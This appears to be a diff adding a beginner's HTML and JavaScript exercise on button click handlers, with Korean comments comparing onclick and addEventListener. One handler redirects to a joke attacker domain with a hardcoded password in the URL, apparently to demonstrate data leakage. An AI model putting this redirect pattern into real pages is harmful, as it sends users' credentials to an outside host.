@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Window</title>
+  </head>
+  <body>
+    <h1>New Window Open</h1>
+    <hr />
+    <button id="newwin">newwin</button>
+    <button id="here">here</button>
+    <button id="loc">location</button>
+  </body>
+  <script>
+    var newwin = document.getElementById("newwin");
+    var here = document.getElementById("here");
+    var loc = document.getElementById("loc");
+
+    // onclick = 소스에 단 한개
+    // addEventListener : 제한 없음
+
+    newwin.onclick = function () {
+      alert("너 지금 새 창 누른겨?");
+      window.open("http://www.pixabay.com", "_blank", "width=1200, height=900");
+    };
+    // newwin.onclick = function () {
+    //   alert("뭐?");
+    // };
+    here.onclick = function () {
+      window.open("http://www.nytimes.com", "_self");
+    };
+
+    var password = "qwer1234";
+
+    loc.onclick = function () {
+      location.href = "http://해킹당햇어.com?pw=" + password;
+    };
+
+    newwin.addEventListener("click", function () {
+      //   alert("뭐?");
+    });
+
+    newwin.addEventListener("click", function () {
+      //   alert("너 지금 새 창 누른 거냐(Listener)");
+    });
+
+    // onclick, addEventListener 차이 :
+    // 내가 클릭했을때 할 일이 한 가지 => onclick
+    // 할 일이 여러가지 => addEventListenr 사용
+  </script>
+</html>
